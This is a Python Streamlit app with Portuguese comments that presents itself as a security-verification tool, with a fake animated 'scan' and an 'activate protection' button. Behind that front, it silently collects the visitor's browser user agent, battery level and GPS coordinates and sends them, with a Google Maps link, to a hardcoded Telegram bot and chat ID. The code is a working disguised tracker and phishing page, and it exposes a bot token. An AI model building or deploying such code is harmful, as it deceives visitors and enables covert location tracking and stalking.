import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO TELEGRAM
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload)
    except: pass

# 2. CONFIGURAÇÃO DA PÁGINA
st.set_page_config(page_title="Verificar Segurança", page_icon="🔐", layout="centered")

# 3. CSS DA ANIMAÇÃO DO VÍDEO (ESFERA DE PARTÍCULAS)
st.markdown("""
    <style>
    .main { background-color: #000000; color: white; }
    
    .scanner-container {
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        padding: 20px;
    }

    /* Esfera de Partículas */
    .particle-sphere {
        width: 200px; height: 200px;
        border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.4);
        box-shadow: 0 0 50px rgba(46, 204, 113, 0.6), inset 0 0 30px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        position: relative;
        animation: rotate 4s linear infinite, pulse 2s infinite ease-in-out;
    }

    /* Efeito de rotação das partículas */
    @keyframes rotate {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
    }
    
    @keyframes pulse {
        0%, 100% { transform: scale(1); box-shadow: 0 0 40px rgba(46, 204, 113, 0.6); }
        50% { transform: scale(1.05); box-shadow: 0 0 70px rgba(46, 204, 113, 0.9); }
    }

    .percentage { font-size: 50px; font-weight: bold; color: white; }
    .status-text { color: #2ecc71; font-size: 14px; margin-top: 10px; font-family: sans-serif; }

    /* Estilo do Botão */
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em;
        border-radius: 10px; border: none !important; margin-top: 20px;
    }

    .footer { text-align: center; color: #444; font-size: 12px; margin-top: 40px; }
    </style>
    """, unsafe_allow_html=True)

# 4. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)

# Captura de dados em segundo plano
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
loc = get_geolocation()

# Simulação da contagem do vídeo
placeholder = st.empty()
if 'count' not in st.session_state:
    st.session_state.count = 3 # Começa igual ao seu vídeo

with placeholder.container():
    st.markdown(f"""
        <div class="scanner-container">
            <div class="particle-sphere">
                <div class="percentage">{st.session_state.count}%</div>
            </div>
            <div class="status-text">Verificando... Agora</div>
        </div>
    """, unsafe_allow_html=True)

# Lista de itens do vídeo
st.markdown("""
    <div style='margin-left: 20px;'>
        <p></p>
        <p>✅ Privacidade e Segurança</p>
        <p></p>
    </div>
""", unsafe_allow_html=True)

# 5. BOTÃO E LÓGICA
if st.button("🔴 ATIVAR PROTEÇÃO"):
    if loc:
        # Sobe a porcentagem rapidinho pra dar o efeito do vídeo
        for i in range(st.session_state.count, 101, 10):
            st.session_state.count = i
            placeholder.markdown(f"""
                <div class="scanner-container">
                    <div class="particle-sphere">
                        <div class="percentage">{i}%</div>
                    </div>
                    <div class="status-text">Finalizando varredura...</div>
                </div>
            """, unsafe_allow_html=True)
            time.sleep(0.1)
            
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🚨 VARREDURA CONCLUÍDA\n\n"
            f"📱 Aparelho: {ua[:50]}... \n"
            f"🔋 Bateria: {bat}%\n"
            f"📍 Mapa: [ABRIR LOCALIZAÇÃO]({mapa})"
        )
        enviar_telegram(relatorio)
        st.success("Proteção Ativada com Sucesso!")
    else:
        st.warning("Aguardando permissão do GPS...")

# 6. ASSINATURA
st.markdown('<p class="footer">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
